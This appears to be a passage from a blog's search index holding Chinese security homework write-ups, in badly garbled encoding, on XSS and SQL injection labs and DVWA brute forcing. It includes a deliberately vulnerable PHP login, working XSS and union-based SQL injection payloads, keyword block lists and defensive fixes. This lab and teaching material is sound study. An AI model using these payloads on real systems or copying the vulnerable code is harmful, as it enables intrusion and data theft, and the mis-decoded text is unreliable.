,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;, &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39; ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;); if (is_array($arr)) &#123; foreach ($arr as $key &#x3D;&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#x2F;&#x2F;ä¸å¯¹magic_quotes_gpcè½¬ä¹‰è¿‡çš„å­—ç¬¦ä½¿ç”¨addslashes(),é¿å…åŒé‡è½¬ä¹‰ã€‚ &#123; $value &#x3D; addslashes($value); &#x2F;&#x2F;ç»™å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ åŠ ä¸Šåæ–œçº¿è½¬ä¹‰ &#125; $value &#x3D; preg_replace($ra,&#39;&#39;,$value); &#x2F;&#x2F;åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸² $arr[$key] &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; &#x2F;&#x2F;phpé˜²æ³¨å…¥å’ŒXSSæ”»å‡»é€šç”¨è¿‡æ»¤ $_POST &amp;&amp; SafeFilter($_POST); if (isset($_POST[&#39;username&#39;])) &#123; $s&#x3D;$_POST[&#39;username&#39;]; echo $s; &#125; ?&gt; &lt;&#x2F;center&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; ç½‘é¡µæºç ååˆ†ç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·è¾“å…¥æ‰€è¦æŸ¥è¯¢çš„usernameï¼Œä¹‹åå°†å…¶è¾“å…¥çš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚ èµ·åˆå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œç›´æ¥æ‰§è¡Œäº†echoï¼Œé€ æˆäº†xssæ¼æ´çš„å‡ºç°ã€‚ 2.æ”»å‡»æ•ˆæœåœ¨è¾“å…¥æ ä¸­è¾“å…¥ä»¥ä¸‹ &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; &lt;img src=1 onerror=alert(/xsss/)&gt; 3.æ¼æ´ä¿®å¤ä¿®å¤æ¼æ´åªéœ€è¦å¯¹ç”¨æˆ·çš„è¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå¹¶å°†ä¸€äº›å¯èƒ½é€ æˆæ”»å‡»çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè®©å…¶ä¸èµ·åˆ°åŸæœ¬çš„ä½œç”¨ã€‚ è¿‡æ»¤å‡½æ•°å¦‚ä¸‹ function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27; ,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27; ,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;, &#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27; ,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //å¾ªç¯è¯­å¥ï¼ŒæŒ¨ä¸ªæ£€æµ‹ &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //ç»™å•å¼•å·ï¼ˆ&#x27;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ åŠ ä¸Šåæ–œçº¿è½¬ä¹‰ &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; å„ä¸ªå‡½æ•°åŠŸèƒ½å¦‚ä¸‹ï¼š magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ åœ¨magic_quotes_gpc=Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰ å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚ addslasheså‡½æ•° htmlentities() å‡½æ•°æŠŠå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ sqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»ç½‘é¡µæºç ï¼Œæœ€å¸¸è§çš„ç™»å½•é¡µé¢ï¼Œå…¶ä¸­æ²¡æœ‰å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œè¿‡æ»¤ï¼Œå°±å°†å…¶å¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢é€ æˆäº†sqlæ³¨å…¥çš„å‡ºç°ã€‚ login.phpæºç  &lt;!DOCTYPE html&gt; &lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt; &lt;title&gt;Sqli&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;body&gt; &lt;div class&#x3D;&quot;limiter&quot;&gt; &lt;div class&#x3D;&quot;container-login100&quot;&gt; &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt; &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt; Account Login &lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt; &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt; Sign in &lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; check.phpæºç  &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success&quot;; &#125; else &#123; echo &quot;username or password error&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; é€»è¾‘å¾ˆç®€å•ï¼Œåœ¨login.phpé¡µé¢æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œå°†usernameå’Œpasswordå‘é€åˆ°check.phpé¡µé¢è¿æ¥æ•°æ®åº“æ£€æŸ¥ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ­£ç¡®åˆ™ï¼Œæ‰“å°å‡ºç”¨æˆ·åå’Œå¯†ç ã€‚ åœ¨æ•°æ®åº“å»ºç«‹äº†ä¸€å¼ userså’Œflagè¡¨ï¼Œä¾¿äºæ³¨å…¥ã€‚ è¡¨ä¸­çš„å†…å®¹å¦‚ä¸‹ 1.æ¼æ´åˆ©ç”¨ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™† username:1&#x27; or 1=1 # username:111 ç»“æœæ‰“å°å‡ºäº†ç¬¬ä¸€ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç  è¿™ä¸ªç»“æœä¹Ÿè¯´åäº†æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œæ¥ä¸‹æ¥åˆ©ç”¨æ”¹æ³¨å…¥ç‚¹è·å–flag åˆ¤æ–­è¡¨æœ‰å‡ åˆ—1&#x27; order by 3# é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè€Œæ”¹ä¸º4çš„æ—¶å€™ç½‘é¡µå‡ºç°æŠ¥é”™ï¼Œè¯´æ˜äº†åªæœ‰ä¸‰åˆ— 1&#x27; order by 4# åˆ¤æ–­æ˜¾ç¤ºä½&#x27; union select 1,database(),3# è¯´æ˜æœ‰ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªä½ç½®è¿›è¡Œæ³¨å…¥å³å¯ã€‚ è·å–è¡¨å&#x27; union select 1,group_concat(table_name),3 from information_schema.TABLES where TABLE_SCHEMA=database()# è·å–åˆ—å&#x27; union select 1,group_concat(COLUMN_name),3 from information_schema.COLUMNS where TABLE_NAME=&#x27;flag&#x27;# ï¼ˆfl4gæ˜¯dvwaå®éªŒä¸­å»ºç«‹æ²¡æœ‰åˆ é™¤ï¼Œæ‰€ä»¥ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†ï¼‰ è·å–flag&#x27; union select 1,group_concat(flag),3 from flag# 2.æ¼æ´é˜²å¾¡æ–¹æ³•ä¸€ï¼šæœ€ç®€å•çš„æ–¹æ³•å¯¹ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦é™åˆ¶ï¼Œä¸€èˆ¬ç”¨æˆ·åçš„é•¿åº¦ä¸è¶…è¿‡åäº”ä¸ªå­—ç¬¦ï¼Œè€Œå¯†ç çš„é•¿åº¦ä¸€èˆ¬ä¸è¶…è¿‡16ä¸ªå­—ç¬¦é•¿åº¦ï¼Œæ‰€ä»¥å¯¹ç”¨æˆ·è¾“å…¥é™åˆ¶é•¿åº¦æ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ä¹‹ä¸€ã€‚å› ä¸ºä¸€èˆ¬çš„æ³¨å…¥è¯­å¥éƒ½æ˜¯è¶…è¿‡åå…­ä¸ªå­—ç¬¦çš„ï¼Œæƒ³è¦åœ¨åå…­ä¸ªå­—ç¬¦ä¹‹å†…æ„é€ å‡ºæœ‰æ•ˆçš„æ³¨å…¥è¯­å¥æ˜¯ä¸€ä»¶å¾ˆéš¾çš„äº‹æƒ…ã€‚ ä»£ç å®ç° &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) &#123; echo &quot;It is too long.&quot;; &#125; else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; æ–¹æ³•äºŒå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå°†å…¶è¾“å…¥çš„å¯èƒ½äº§ç”Ÿæ¶æ„è¡Œä¸ºçš„ä»£ç åˆ é™¤æˆ–è€…è½¬ä¹‰ï¼Œä½¿å…¶å¤±å»åŸæ¥çš„åŠŸèƒ½ã€‚ ä»£ç å®ç° &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; //echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;; //echo &quot;&lt;hr&gt;&quot;; function inject_check($Sql_Str) &#123;//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚ $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; $pwd=inject_check($pwd); $uname = inject_check($uname); $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; // else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; è¿‡æ»¤å‡½æ•°å¦‚ä¸‹ï¼Œå…¶ä¸­å°†ä¸€èˆ¬æ³¨å…¥éœ€è¦ç”¨åˆ°çš„å‡½æ•°å’Œç¬¦å·éƒ½è¿‡æ»¤äº†ã€‚ function inject_check($Sql_Str) &#123;//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚ $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; æ–¹æ³•ä¸‰ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ ä»£ç å¦‚ä¸‹ &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; // function inject_check($Sql_Str) &#123;//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚ // $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); // if ($check) &#123; // echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; // exit(); // &#125;else&#123; // return $Sql_Str; // &#125; // &#125; // $pwd=inject_check($pwd); // $uname = inject_check($uname); // $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; $result = $mysqli-&gt;prepare(&quot;select * from users where username=? and password=?&quot;); $result-&gt;bind_param(&#x27;ss&#x27;,$uname,$pwd); $result-&gt;execute(); $result-&gt;store_result(); $result-&gt;bind_result($id,$un,$pd); //å°†æŸ¥è¯¢åˆ°çš„å˜é‡ç»‘å®šåˆ°ä¸‰ä¸ªè‡ªå®šä¹‰çš„å˜é‡ä¸­ï¼Œè¾“å‡ºæ—¶ç›´æ¥è¾“å‡ºè¿™ä¸‰ä¸ªå˜é‡å³å¯ã€‚ if($result-&gt;fetch()) &#123; printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$un,$pd); &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; echo &quot;&lt;/TABLE&gt;&quot;; echo &quot;&lt;/div&gt;&quot;; $result-&gt;close(); $mysqli-&gt;close(); ?&gt; åº”ç”¨é¢„ç¼–è¯‘è¯­å¥åï¼Œå†æ¬¡è¾“å…¥æ³¨å…¥è¯­å¥åå°±ä¸å†èµ·åˆ°æ³¨å…¥ä½œç”¨ï¼Œåªæ˜¯å°†å…¶å½“æˆæ­£å¸¸çš„æŸ¥è¯¢è¿‡ç¨‹ï¼Œè¿”å›ç›¸åº”çš„ç»“æœã€‚","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"}]},{"title":"ç½‘å®‰ä½œä¸š2","date":"2020-11-12T11:09:43.000Z","path":"2020/11/12/ç½‘å®‰ä½œä¸š2/","text":"DVWAå®éªŒä¸€ä¸‹éƒ½æ˜¯åŸºäºlow,mid,highçº§åˆ«çš„å®éªŒï¼Œä¸ºäº†æ–¹ä¾¿å™è¿°ï¼Œæå‰åœ¨æ•°æ®åº“ä¸­å»ºäº†ä¸€ä¸ªflagè¡¨ Brute Forceä½¿ç”¨å·¥å…· ï¼šbp ä½¿ç”¨ææ–™ï¼šå¯†ç å­—å…¸ bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹ç¬¬ä¸€ç§ï¼šSniperæ ‡ç­¾ è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚ ç¬¬äºŒç§ï¼šBattering ram â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­ ç¬¬ä¸‰ç§ï¼šPitchfork â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡ ç¬¬å››ç§ï¼šCluster bomb â€“ è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚ low1.æŠ“åŒ…â€“&gt;ctrl+I â€“&gt;æ ‡è®°è¦çˆ†ç ´çš„å‚æ•°ï¼Œè¿™é‡Œç›´æ¥çˆ†ç ´password 2.é€‰æ‹©è¦åŠ è½½çš„å¯†ç å­—å…¸ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå·±å‡†å¤‡çš„å¯†ç å­—å…¸ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„å¯†ç å­—å…¸ï¼Œä½†æ˜¯æœ€é‡è¦çš„æ˜¯è¦åŒ…å«æ­£ç¡®è¾¾åˆ°å¯†ç  3.å¼€å§‹çˆ†ç ´ ï¼Œæ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç­›é€‰å‡ºæ­£ç¡®å¯†ç çš„å“åº”åŒ…ï¼Œè¿™é‡Œåªæœ‰å½“å¯†ç ä¸ºpasswordçš„æ—¶å€™å“åº”åŒ…çš„é•¿åº¦ä¸º4743,æ‰€ä»¥passwordå°±æ˜¯äº‰å–å¯†ç ã€‚ medium&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? 